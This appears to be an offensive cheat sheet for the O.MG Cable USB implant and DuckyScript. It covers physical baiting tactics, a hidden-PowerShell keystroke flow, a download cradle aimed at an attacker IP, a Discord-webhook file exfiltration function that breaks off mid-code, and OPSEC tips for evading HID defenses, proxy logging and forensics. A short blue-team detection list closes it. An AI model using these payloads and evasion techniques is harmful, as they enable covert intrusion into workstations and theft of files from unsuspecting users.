O.MG Cable & Hardware Implant Payloads

The O.MG Cable is a hardware implant disguised as a standard USB cable (Lightning, USB-C, USB-A). Internally it contains a Wi-Fi enabled microcontroller that emulates a USB HID device (keyboard/mouse). When plugged in, it can execute payloads stored on the device or delivered over Wi-Fi — all while appearing to be an ordinary charging cable. Used in physical intrusion engagements and red team scenarios requiring clandestine access to air-gapped or locked workstations.

Hardware Overview

# O.MG Cable variants (Hak5):
# - O.MG Cable (Lightning, USB-C, USB-A)
# - O.MG Plug (USB-A stub, no cable)
# - O.MG Adapter (USB-C to USB-A)
# Firmware 3.0+ required for full DuckyScript 3.0 support

# Capabilities:
# - USB HID keyboard/mouse emulation (types keystrokes at hardware speed)
# - Built-in Wi-Fi (802.11 b/g/n) — acts as AP or connects to target network
# - Payload storage (internal flash)
# - Remote trigger via Wi-Fi — detonate payload at a chosen time
# - Keylogger mode — capture all keystrokes to internal memory
# - Self-destruct (erase payload after execution)

# Similar tools covered by same payloads:
# - Hak5 USB Rubber Ducky (DuckyScript compatible, no Wi-Fi)
# - Bash Bunny (multi-vector, USB mass storage + HID)
# - Digispark / Attiny85 (Arduino-based, similar DuckyScript)

# Physical attack scenarios:
# - Leave on desk / drop in parking lot (curiosity bait)
# - Social engineer target into plugging in "found cable"
# - Plant during physical access (evil maid, insider threat simulation)
# - Replace target's actual cable during brief unsupervised access

DuckyScript 3.0 Syntax

# DuckyScript is the scripting language for O.MG, Rubber Ducky, and compatible devices.
# Full reference: github.com/hak5/usbrubberducky-payloads

# Core commands:
REM            # Comment (not executed)
DELAY 1000     # Wait 1000ms (1 second)
STRING text    # Type the literal string (no newline)
STRINGLN text  # Type string and press ENTER
ENTER          # Press Enter key
GUI r          # Windows key + R (opens Run dialog)
CTRL c         # Ctrl+C
ALT F4         # Alt+F4

# Key names: GUI, ALT, CTRL, SHIFT, ENTER, ESCAPE, TAB, SPACE,
#            DELETE, BACKSPACE, HOME, END, INSERT, PAGEUP, PAGEDOWN,
#            UP, DOWN, LEFT, RIGHT, CAPSLOCK, F1-F12

# Variable definitions (DuckyScript 3.0):
DEFINE #TARGET_IP 192.168.1.100
DEFINE #PORT 4444
# Use in STRING: STRING $c = new-object net.webclient; $c.downloadstring(#TARGET_IP)

# Keyboard language:
DUCKY_LANG us  # US layout (default)
DUCKY_LANG de  # German layout (important — wrong layout = garbled output)
DUCKY_LANG uk  # UK layout

# Typical attack flow:
DELAY 1500         # Wait for OS to recognize device
GUI r              # Open Run dialog
DELAY 500
STRINGLN powershell -NoP -NonI -w H    # Run PowerShell hidden
DELAY 500
STRING [PAYLOAD HERE]
ENTER
CAPSLOCK           # Some O.MG payloads use CAPSLOCK as delimiter

# PowerShell function to send files to Discord:
$webhook = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"

function Send-ToDiscord($file) {
    $form = @{ file = Get-Item $file }

Detection & OPSEC

# Detection indicators:
# - New HID device appears (USB descriptor: keyboard/mouse)
# - Rapid keystroke activity immediately after USB plug-in
# - PowerShell process spawned from unusual parent (explorer.exe)
# - Network connection to external IP immediately after USB plug
# - New processes run from %TEMP% shortly after cable plug

# OPSEC improvements:
# 1. Add longer initial DELAY (5000-10000ms) before any keystroke activity
#    → Avoids triggering HID-based defenses on USB plug
# 2. Obfuscate PowerShell strings (mixed case, aliases, encoding)
#    → IEX → iEx → i`eX → &([scriptblock]::Create(...))
# 3. Use DNS exfil instead of HTTP → bypasses web proxy logging
# 4. Self-destruct: O.MG firmware can wipe payload after execution
# 5. Only activate via Wi-Fi trigger (don't auto-run on plug)
#    → Allows placement and controlled remote detonation

# Network-based detection (blue team):
# - Monitor for new USB device events (EventID 2003 in WinRM log)
# - EDR: flag processes spawned within seconds of USB device connect
# - Monitor DNS for unusual TXT record queries
# - PowerShell ScriptBlock logging (EventID 4104) captures inline commands
